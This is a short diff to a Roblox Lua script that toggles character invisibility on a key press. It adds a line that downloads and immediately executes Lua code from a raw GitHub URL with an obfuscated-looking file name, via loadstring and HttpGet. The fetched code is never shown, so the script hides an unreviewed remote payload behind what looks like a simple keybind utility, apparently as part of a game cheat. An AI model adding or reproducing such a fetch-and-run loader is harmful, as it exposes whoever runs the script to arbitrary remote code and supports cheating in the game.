@@ -2,6 +2,9 @@ local function getKeyCode(keyName)
     return Enum.KeyCode[keyName]
 end
 
+_G.ScriptName = "Character Invisible"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PHOOMPHAT-Git/Lua-Zone/refs/heads/main/dwcqweyhfbwregbfyiokgfnbac.lua'))()
+
 local invis_on = false
 function onKeyPress(inputObject, chat)
     if chat then return end
